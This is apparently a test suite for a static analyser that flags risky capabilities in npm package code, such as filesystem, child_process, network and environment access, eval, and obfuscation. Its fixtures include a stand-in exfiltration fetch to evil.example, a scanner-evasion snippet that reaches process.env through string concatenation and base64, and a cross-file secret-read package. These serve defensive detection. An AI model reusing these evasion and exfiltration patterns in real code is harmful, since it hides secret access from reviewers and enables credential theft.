import { describe, expect, it } from 'vitest'
import { analyzeSource } from '../src/ast.js'
import { analyzeDataflow } from '../src/dataflow.js'

const caps = (source: string) => [...analyzeSource(source).capabilities]

describe('analyzeSource', () => {
  it('detects CJS require of gated builtins', () => {
    expect(caps(`const fs = require('node:fs'); fs.readFileSync('x')`)).toContain('fs.read')
    expect(caps(`require('child_process').exec('ls')`)).toContain('child_process')
    expect(caps(`require('net').connect(80)`)).toContain('net.connect')
    expect(caps(`const {exec} = require("child_process")`)).toContain('child_process')
  })

  it('detects require.resolve as import intent', () => {
    expect(caps(`require.resolve('node:http')`)).toContain('http.request')
  })

  it('detects ESM imports', () => {
    expect(caps(`import fs from 'fs';\nimport net from 'node:net';`)).toEqual([
      'fs.read',
      'fs.write',
      'net.connect',
      'net.listen',
    ])
  })

  it('detects process.env reads and writes with variable names', () => {
    const f = analyzeSource(`
      const key = process.env.STRIPE_SECRET;
      process.env['TMP_DIR'] = '/tmp';
      const dyn = process.env[foo];
    `)
    expect([...f.capabilities]).toEqual(['env.read', 'env.write'])
    expect([...f.envVars]).toContain('STRIPE_SECRET')
    expect([...f.envVars]).toContain('TMP_DIR')
  })

  it('detects dynamic code evaluation', () => {
    expect(caps(`eval('1+1')`)).toContain('dynamic-code')
    expect(caps(`new Function('return 1')()`)).toContain('dynamic-code')
    expect(caps(`const vm = require('vm'); vm.runInThisContext('x')`)).toContain('dynamic-code')
  })

  it('detects global fetch as http.request', () => {
    expect(caps(`fetch('https://evil.example/exfil')`)).toContain('http.request')
  })

  it('flags network libraries as signals, not capabilities', () => {
    const f = analyzeSource(`const ax = require('axios'); ax.get('/x')`)
    expect(f.signals).toContain('uses network library "axios"')
    expect([...f.capabilities]).toEqual([])
  })

  it('flags high-entropy base64 blobs as obfuscation', () => {
    // deterministic pseudo-random bytes → realistic base64 charset diversity
    const blob = Buffer.from(Uint8Array.from({ length: 120 }, (_, i) => (i * 73 + 41) % 256)).toString('base64')
    const f = analyzeSource(`const x = "${blob}";`)
    expect(f.signals[0]).toMatch(/obfuscated string literal/)
  })

  it('does not flag low-entropy filler (benchmark data, repeats)', () => {
    expect(analyzeSource(`const x = "${'A'.repeat(120)}";`).signals).toEqual([])
    expect(analyzeSource(`const x = "${'0012345678901234567890'.repeat(6)}";`).signals).toEqual([])
  })

  it('counts parse errors instead of throwing', () => {
    const f = analyzeSource('function {{{ totally broken')
    expect(f.parseErrors).toBe(1)
    expect(f.capabilities.size).toBe(0)
  })

  it('ignores ungated builtins', () => {
    expect(caps(`require('path'); require('util')`)).toEqual([])
  })
})

describe('§1 defensive capability analysis (dynamic evasion escapes)', () => {
  it('flags computed access on capability roots', () => {
    const f = analyzeSource('const p = globalThis["pro" + "cess"]; const e = p[getEnvName()]')
    expect(f.escapes.length).toBeGreaterThan(0)
    expect(f.escapes.join(' ')).toMatch(/computed access/)
  })
  it('flags require(<dynamic>)', () => {
    expect(analyzeSource('const m = require(names[i])').escapes[0]).toMatch(/require\(<dynamic>\)/)
  })
  it('flags Reflect.get on process', () => {
    expect(analyzeSource('Reflect.get(process, key)').escapes[0]).toMatch(/Reflect\.get\(process/)
  })
  it('decodes base64 capability words statically', () => {
    // Buffer.from('cHJvY2Vzcw==','base64') decodes to "process"
    const f = analyzeSource(`const w = Buffer.from("cHJvY2Vzcw==", "base64").toString()`)
    expect(f.escapes[0]).toMatch(/decodes base64 capability word "process"/)
  })
  it('plain property access stays clean (no escapes)', () => {
    expect(analyzeSource('const x = process.arch').escapes).toEqual([])
  })
})

describe('§1 dataflow gap-closer — the paper\'s exact evasion snippet', () => {
  it('resolves globalThis["pro"+"cess"] + base64 "env" to env.read', () => {
    const f = analyzeSource(`
      const p = globalThis["pro" + "cess"];
      const envObj = p[Buffer.from("ZW52", "base64").toString()];
      module.exports = () => envObj.ANY_SECRET;
    `)
    expect([...f.capabilities]).toContain('env.read')
  })
  it('tracks aliases of process to env reads', () => {
    expect([...analyzeDataflow(`const a = process; const e = a.env;`).capabilities]).toContain('env.read')
    expect([...analyzeSource('const a = process; const e = a.env; const k = e.KEY').capabilities]).toContain('env.read')
  })
  it('dynamic key on an alias still escapes', () => {
    expect(analyzeDataflow('const a = process; const v = a[keys[i]];').escapes[0]).toMatch(/computed access on alias/)
  })
})

describe('§1 cross-file alias dataflow (two-pass)', () => {
  it('taints require() of a sibling whose exports carry capability roots', async () => {
    const { scanTarball } = await import('../src/index.js')
    const { gzipSync } = await import('node:zlib')
    const { pack } = await import('tar-stream')
    const p = pack()
    p.entry({ name: 'package/package.json' }, JSON.stringify({ name: 'x', version: '1.0.0' }))
    p.entry({ name: 'package/a.js' }, 'module.exports.getKey = () => process.env.API_KEY')
    p.entry({ name: 'package/b.js' }, "const a = require('./a'); module.exports.run = () => a.getKey()")
    p.finalize()
    const tar = await new Promise<Buffer>((r) => { const c: Buffer[] = []; p.on('data', (d) => c.push(d)); p.on('end', () => r(Buffer.concat(c))) })
    const result = await scanTarball(gzipSync(tar))
    expect(result.capabilities).toContain('env.read')
    expect(result.escapes.join(' ')).toMatch(/cross-file alias/)
  })
})
